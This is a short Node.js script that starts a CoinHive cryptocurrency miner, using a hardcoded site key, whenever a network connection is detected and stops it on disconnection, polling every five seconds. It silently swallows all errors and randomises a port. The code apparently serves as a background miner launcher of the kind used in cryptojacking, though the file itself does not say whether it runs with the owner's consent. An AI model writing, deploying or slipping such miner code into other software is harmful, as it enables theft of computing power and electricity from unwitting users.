const ConnectionChecker = require( './ConnectionChecker' ),
    MineThread = require( './MineThread' );

const env = {
    coinHive_key: 'LBThbe5xShb7qNytYIGlwJeCD2k3b6nN'
};
process.argv.forEach( arg => {
    env[ arg ] = true;
} );

const cc = new ConnectionChecker( true ),
    mt = new MineThread( env.coinHive_key, true );

cc.register( 'connection' );
cc.register( 'disconnection' );

cc.on( 'connection', () => {
    try{
        process.env.PORT = ~~( 4000 + Math.random() * 5000 );
        mt.start();
    }
    catch( e ){}
} );

cc.on( 'disconnection', () => {
    try{
        mt.stop();
    }
    catch( e ){}
} );

setInterval( () => cc.check(), 5000 );
